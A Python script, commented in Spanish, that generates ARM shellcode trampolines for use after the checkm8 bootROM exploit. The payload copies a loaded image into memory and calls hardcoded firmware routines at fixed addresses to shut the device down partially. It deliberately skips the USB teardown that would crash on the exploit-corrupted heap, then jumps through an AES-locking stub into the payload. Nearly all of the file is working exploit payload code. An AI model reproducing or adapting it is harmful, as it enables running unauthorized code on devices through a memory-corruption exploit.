"""Generador de trampolines ARM con literales calculados (para no equivocarse con los offsets).
Instrucciones soportadas: ("ldr", reg, valor) | ("blx", reg) | ("raw", palabra) | ("mov0", reg) | ("movr", dst, src)
"""
import struct

def build(prog, base):
    lits, lit_index = [], {}
    for ins in prog:
        if ins[0] == "ldr" and ins[2] not in lit_index:
            lit_index[ins[2]] = len(lits); lits.append(ins[2])
    n = len(prog)
    words = []
    for i, ins in enumerate(prog):
        pc = i * 4
        if ins[0] == "ldr":
            target = n * 4 + lit_index[ins[2]] * 4
            imm = target - (pc + 8)
            assert 0 <= imm < 4096
            words.append(0xE59F0000 | (ins[1] << 12) | imm)
        elif ins[0] == "blx":
            words.append(0xE12FFF30 | ins[1])
        elif ins[0] == "mov0":
            words.append(0xE3A00000 | (ins[1] << 12))
        elif ins[0] == "movr":
            words.append(0xE1A00000 | (ins[1] << 12) | ins[2])
        elif ins[0] == "raw":
            words.append(ins[1])
    return b"".join(struct.pack("<I", w) for w in words + lits)

def copy_loop(load, src, length):
    """Copia length bytes de src a load (r0,r1,r2,r3)."""
    return [("ldr", 0, load), ("ldr", 1, src), ("ldr", 2, length),
            ("raw", 0xE4913004), ("raw", 0xE4803004), ("raw", 0xE2522004), ("raw", 0x1AFFFFFB)]

def jump_no_usb_quiesce(entry):
    """Como 0x5D1C pero SIN 0x4E9C/0x71AC (apagado del USB), que hace free() sobre el heap dañado por checkm8."""
    return [
        ("ldr", 5, 0x6C75), ("blx", 5), ("movr", 8, 0),           # r8 = stub (0x6C74 lo copia al heap)
        ("mov0", 0), ("ldr", 4, 0x5B7D), ("blx", 4),               # 0x5B7C(0)
        ("mov0", 0), ("ldr", 4, 0x4EB1), ("blx", 4),               # 0x4EB0(0)  apagado de plataforma
        ("ldr", 4, 0xD89), ("blx", 4),                              # 0xD88 (parte de 0x4E9C, sin el USB)
        ("ldr", 4, 0x5A89), ("blx", 4),                             # 0x5A88
        ("ldr", 4, 0x6055), ("blx", 4),                             # 0x6054 interrupciones off
        ("ldr", 4, 0x6C45), ("blx", 4),                             # 0x6C44 cachés/MMU
        ("ldr", 0, entry), ("mov0", 1), ("mov0", 2), ("mov0", 3),
        ("blx", 8),                                                 # stub: bloquea AES y salta a r0
        ("raw", 0xEAFFFFFE),
    ]

if __name__ == "__main__":
    from capstone import Cs, CS_ARCH_ARM, CS_MODE_ARM
    prog = copy_loop(0x34000000, 0x34000100, 0x12000) + jump_no_usb_quiesce(0x34000000)
    b = build(prog, 0x34039A00)
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    for i in md.disasm(b[:len(prog) * 4], 0x34039A00):
        ex = ""
        if "[pc, #" in i.op_str:
            off = int(i.op_str.split("#")[1].rstrip("]"), 0)
            la = i.address + 8 + off - 0x34039A00
            ex = " ; =%#x" % struct.unpack("<I", b[la:la + 4])[0]
        print(hex(i.address), i.mnemonic, i.op_str, ex)
